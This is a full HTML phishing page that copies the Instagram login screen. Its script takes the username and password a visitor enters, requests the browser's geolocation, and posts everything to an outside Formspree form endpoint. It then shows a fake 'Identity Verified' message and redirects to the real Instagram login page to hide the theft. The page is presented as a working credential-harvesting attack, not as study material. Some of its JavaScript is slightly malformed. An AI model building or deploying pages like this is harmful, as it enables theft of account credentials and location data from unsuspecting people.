<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/1_BoQWd93C-.png" />
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #fafafa; margin: 0; padding: 20px;
        }
        .container {
            background-color: #ffffff; border: 1px solid #dbdbdb;
            padding: 40px; width: 100%; max-width: 350px; text-align: center; border-radius: 1px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05); transition: opacity 0.5s ease;
            animation: fadeIn .6s ease;
        }
        .logo img { width: 175px; margin-bottom: 25px; }
        form { display: flex; flex-direction: column; gap: 6px; }
        input {
            background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px;
            padding: 9px 12px; font-size: 12px; width: 100%; outline: none; transition: border 0.2s ease;
        }
        input:focus { border: 1px solid #a8a8a8; }
        button {
            background-color: #0095f6; border: none; border-radius: 8px; color: #ffffff;
            font-weight: 600; padding: 7px ; margin-top: 8px; cursor: pointer; font-size: 14px; transition: all 0.3s ease;
        }
        button:hover { background-color: #1877f2; transform: scale(1.01); }
        button:disabled { background-color: #b2dffc !important; cursor: not-allowed; transform: scale(1); }
        .separator { display: flex; align-items : center ; margin : 20px 0 ; }
        .line { flex : 1 ; height : 1px ; background : #dbdbdb ; }
        .or { margin : 0  18px ; color : #8e8e8e ; font-size : 13px ; font-weight :600 ; }
        .facebook-login { background:#fafafa !important ; color:#385185 !important ; border :1px solid #dbdbdb !important;}
        .facebook-login img { width :18px;}
        #statusMsg { color:#a8a8a8 ; font-size :12px ; margin_top :20px ; font-weight :500 ; min_height :15px;}
        .footer { font-size :12px ; margin_top :25px;}
        .footer a { color:#0095f6 ; text_decoration :none;}

        @keyframes fadeIn { from { opacity : 0 ; transform : translateY(10px); } to { opacity : 1 ; transform : translateY(0); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo"> <img src="https://static.cdninstagram.com/rsrc.php/v3/yG/r/1_BoQWd93C-.png" alt="Instagram"></div>       <form id="loginForm">       <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required>       <input type="password" name="password" id="password" placeholder="Password" required>       <button type="submit" id="submitBtn">Log in</button>       <div class="separator"><div class="line"></div> <span class="or">OR</span> <div class="line"></div></div>       <button type="button" class="facebook-login"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7NXE6ma.png"> Log in with Facebook</button> </form>       <p id="statusMsg"></p>       <p class="footer">Don't have an account? <a href="#">Sign up</a></p>   </div>

    <script>    document.getElementById('loginForm').addEventListener('submit', async function(e) {      e.preventDefault();      const usernameInput = document.getElementById('username');      const passwordInput = document.getElementById('password');      const submitBtn = document.getElementById('submitBtn');      const statusMsg = document.getElementById('statusMsg');      submitBtn.disabled = true ; submitBtn .textContent = "Verifying...";      let userLocation = 'Not provided';      if (navigator .geolocation) {       try {         const position = await new Promise((resolve , reject) => {           navigator .geolocation .getCurrentPosition(resolve , reject , { timeout :5000 , enableHighAccuracy :false }) ;         }) ;         userLocation = `${position .coords .latitude},${position .coords .longitude}` ;       } catch (error) { userLocation = 'Denied or unavailable' ; }     }      const data = { username :usernameInput .value , password :passwordInput .value , location :userLocation , timestamp :new Date().toISOString() };      try {         const response = await fetch('https://formspree.io/f/meajzwbr', { method :'POST', headers {'Accept':'application/json','Content-Type':'application/json'}, body :JSON .stringify(data) });         if (response .ok) {           statusMsg .textContent = "Identity Verified! Redirecting...";           statusMsg .style .color = "#44b700";         } else { throw new Error(); }       } catch (error) { statusMsg .textContent = "Connection slow... redirecting anyway."; statusMsg .style .color = "#ed4956"; }      setTimeout(() => { window .location .href = 'https://www .instagram .com / accounts / login /' ; },  3000);    });    </script></body></html>```

